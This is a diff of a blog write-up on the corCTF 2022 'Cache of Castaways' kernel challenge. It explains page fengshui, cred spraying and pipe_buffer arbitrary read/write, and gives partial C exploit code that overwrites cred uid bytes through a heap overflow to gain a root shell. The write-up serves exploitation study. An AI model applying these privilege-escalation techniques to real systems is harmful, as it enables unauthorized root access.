@@ -1,5 +1,5 @@
 ---
-title: "Limit Heap Overflow to Root with Cred (Limit Spray Fengshui Crafting) /Pipe_buffer (Pipe Buffer AAR/AAW): Cache of Castaways (corCTF 2022)"
+title: "Limit Heap Overflow to Root with Cred (OOB Fengshui Crafting) /Pipe_buffer (Pipe Buffer AAR/AAW): Cache of Castaways (corCTF 2022)"
 date: 2024-06-28 13:33:00
 tags: 
 layout: default
@@ -7,12 +7,12 @@ layout: default
 
 # 0x00 Introduction
 
-To practice kernel exploitation, I plan to solve old CTF challenges and learn different skills from others. Before doing this challenge, I already know the cross-cache attack from [IPS][1]. But when I applied the same method to this challenge, I found it difficult to perform cross-page when the target allocation was noisy. After reproducing the official write I exploited it with `pipe_buffer`.
+To practice kernel exploitation, I plan to solve old CTF challenges and learn different skills from others. Before doing this challenge, I already knew about the cross-cache attack from [IPS][1]. However, when I applied the same method to this challenge, I found it difficult to perform cross-page when the target allocation was noisy. After reproducing the official write I exploited it with `pipe_buffer`.
 
 
 - Heap Overflow
 - Spray Creds
-- Limit Spray Fengshui Crafting
+- OOB Fengshui Crafting
 - `Pipe_buffer` AAR/AAW
 
 
@@ -31,15 +31,15 @@ So we mainly have two ways to attack
 - cross page overflow to modify metadata -> for example, `creds->uid`
 - cross page to modify pointers to create -> for example, `seq_file->op->signle_start`
 
-In the second way, we don't need a leak but a little brute force. I didn't try but learned from @zolutal that kernel code is not very random.
+In the second way, we don't need a leak but a little brute force. I didn't try but I learned from @zolutal that kernel code is not very random.
 
-# 0x02 Ideal Senario
+# 0x02 Ideal Scenario
 
 This challenge is easy! We have a vulnerable page next to a cred page. Then we use `edit` to overflow the first 6 bytes of cred then we become root!
 
-Tip: Considering the first 4 bytes for creds is `usage` we'd better overwrite it with non-zero values. In practice, I would like to overwrite it with a large number, such as 0x132, since I found if we set it to 1/0, we may fail on some cases (e.g., when it's 1, we can't seteuid).
+Tip: Considering the first 4 bytes for creds is `usage` we'd better overwrite it with non-zero values. In practice, I would like to overwrite it with a large number, such as 0x132, since I found if we set it to 1/0, we may fail in some cases (e.g., when it's 1, we can't seteuid).
 
-But how to get senario is not easy if we don't know the settubf up better Fengshui and avoiding noise.
+However, getting a scenario is not easy if we don't know how to set up better fengshui and avoid noise.
 
 # 0x05 Exploitation
 
@@ -67,7 +67,7 @@ However, when it's noisy, it may not hit. There are two main ways to make it eas
 
 ## 5.2 Make it less noisy
 
-Since the limit of allocation for both creds and vulnerable objects. We can do little to spray more. We only have a window of about 0x40 pages. In the original write up, the author figured out a way to make it less noisy. 
+Since the limit of allocation for both creds and vulnerable objects. We only have a window of about 0x40 pages. In the original write up, the author figured out a way to make it less noisy. 
 
 ```
 #define CLONE_FLAG CLONE_FILES | CLONE_FS | CLONE_VM | CLONE_SIGHAND
@@ -86,17 +86,18 @@ pid
 
 ## 5.3 Details
 
-After I reproduced the official solution with the value it provides, I got a root shell. But I was still confused about "how do the author get these numbers?" and tried to modify the number in the script finding these numbers could be computed percisly or I can't get a root shell.
+After I reproduced the official solution with the value it provides, I got a root shell. But I was still confused about "how does the author get these numbers in the script?".
 
 
 ```c
-nt main(){
+int main(){
     // shell();
     libxInit();
     fd = open("/dev/castaway",2);
     // Step 1. Drain Creds
+    // 200 is not enough and 800 is good. make sure you drain all the creds
     for(int i = 0 ; i < 800; i++)
-        fork_sleep();
+        fork_sleep(); 
     // Step 2. Init the SockPageAllocator
     spaInit();
     // Step 3. Do page draining
@@ -129,7 +130,7 @@ nt main(){
 
 ```
 
-Based on the skills we talked, we are able to generate the above exploit. However, how to set the numbers in the exploit to improve the success rate that we get the creds pages just after `vulnerable page` where we can OOB write? 
+Based on the skills we talked about, we are able to generate the above exploit. However, how to set the numbers in the exploit to improve the success rate that we get the creds pages just after the `vulnerable page` where we can OOB write? 
 
 ```c
 #define NR_PAGE_DRAINING ?
@@ -139,20 +140,20 @@ Based on the skills we talked, we are able to generate the above exploit. Howeve
 ```
 
 
-First, if we want to improve the possibility to hit, we'd better create as many as vulnerable pages as possible. so I set
+First, if we want to improve the possibility of hitting, we'd better create as many as vulnerable pages as possible. so I set
 
 ```c
 #define NR_VUl_TARGETS 0x1f8
 ```
 
-Then, considering the limit of `clone` that the more we `clone` the slower the machine is, I set `NR_CREDS` to 0x40 which takes 2-3 second to finish creds spraying.
+Then, considering the limit of `clone` that the more we `clone` the slower the machine is, I set `NR_CREDS` to 0x40 which takes 2-3 seconds to finish creds spraying.
 
 
 ```c
 #define NR_CREDS 0x40 
 ```
 
-`NR_PAGE_DRAINING` is also easy to compute. I wrote a kernel module and keep allocating and printing the allocated page addresses. Then I found 0x200 should be a safe number to make sure we can get contiguous pages in the later page allocation.
+`NR_PAGE_DRAINING` is also easy to compute. I wrote a kernel module and kept allocating and printing the allocated page addresses. Then I found 0x200 should be a safe number to make sure we can get contiguous pages in the later page allocation.
 
 
 
@@ -160,19 +161,18 @@ Then, considering the limit of `clone` that the more we `clone` the slower the m
 #define NR_PAGE_DRAINING 0x200
 ```
 
-At the end, a little math is needed to get `NR_CNT_PAGES`. If you set it too small, the noise may influence more to your attacking. If you set it too large the following case may happen:
 
-- Assuming we have 8 pages `[0...7]`
-- Free the first half so we get the free-list: `[6,4,2,0]`
-- Spray some `object1` to get some pages in free-list, and assuming we got 6 and 4 so we still have free-list: `[2,0]`
-- Free the second half so we get the free-list: `[7,5,3,1,2,0]`
-- Spray some `object2` to get pages in free-list
-- The limit spray of `object2` results in that we only get page 7 and 5 from freelist which are not next to the `object1` pages
+Then we have to consider how many contiguous pages should be used. Therefore, considering we have around 0x40 pages of OOB pages. To fill them we need 0x40 pages as the first half of the contiguous area. Therefore, we should set `NR_CNT_PAGES` to 0x80 and set `object1` to the `vulnerable object` to improve the success rate. If it's larger or smaller than 0x80, don't worry too much since if you used the pattern that:
 
-Therefore, considering we have around 0x40 pages of OOB pages. We should set `NR_CNT_PAGES` to 0x80 and set `object1` to the `vulnerable object` to improve the success rate.
+- Free first half: 0,2,4,8 ...
+- Spray Object 1
+- Free the second half: 1,3,5,7...
+- Spray Object 2
+
+
+It's because both the sprayed objects will always be on the large index pages. Too small `NR_CNT_PAGES` make the attacking window too small while too large `NR_CNT_PAGES` may take a too long time and noise may influence more(in most cases, it'll be okay).
 
 In the end, we have
-
 ```c
 #define NR_PAGE_DRAINING 0x200
 #define NR_CNT_PAGES 0x80
@@ -250,27 +250,9 @@ void edit(size_t idx,size_t size, __u8 * payload){
 };
 void add(){int res = ioctl(fd,0xcafebabe,0);};
 
-void do_sleep(){
-    sleep(3);
-}
-
-void ddddoshell(void){
-    seteuid(0);
-    if(getuid()==0)
-            system("/bin/sh");
-    sleep(1000);
-}
 void fork_sleep(){
-    if(fork()){
-        do_sleep();
-        ddddoshell();
-        // _exit(1);
-    }
-}
-int key_alloc(char *description, char *payload, int payload_len)
-{
-    return syscall(__NR_add_key,"user", description, payload, payload_len, 
-                   KEY_SPEC_PROCESS_KEYRING);
+    if(fork())
+        sleep(1000);
 }
 
 #define NR_PAGE_DRAINING 0x200
@@ -305,7 +287,7 @@ int main(){
     
     // Step 6. OOB Write
     char *buf = calloc(1,0x200);
-    memset(buf+0x200-6,'\x00',4);
+    memset(buf+0x200-6,'\x33',4);
     memset(buf+0x200-2,'\x00',2);
     for(int i = 0 ; i < NR_VUl_TARGETS; i++)
         edit(i,0x200,buf);
@@ -314,6 +296,7 @@ int main(){
     info("Zz...");
     debug();
 }
+
 
 ```
 
@@ -330,7 +313,7 @@ Each page structure represents one page in the memory. We can get the virtual ad
 
 
 Therefore, changing the page structure in Pipebuffer means gaining Read/Write Access on another page:
-- With several bytes overflow(theoretically one byte is enough but in this challenge, we have 3 bytes), we are able to overwrite some important data (e.g., `PipeBuffer`'s Page Pionter)
+- With several bytes overflow(theoretically, one byte is enough but in this challenge, we have 3 bytes), we are able to overwrite some important data (e.g., `PipeBuffer`'s Page Pionter)
 - We have Read/Write Access on another page -> Leak / Hijack Control Flow
 - This is not stable for some reason after you run one command. (I may not have time to figure it out recently).
 
@@ -566,8 +549,8 @@ int main(){
 
 TODO:
 - [Done] Figure out fengshui of the official solution 
-- Fiugure out why it crashes after run arbitrary commands
-- Learn more page allocation
+- Figure out why it crashes after running arbitrary commands
+- Learn more about page allocation
 
 Learned:
 - `pipe_buffer` aar/aaw
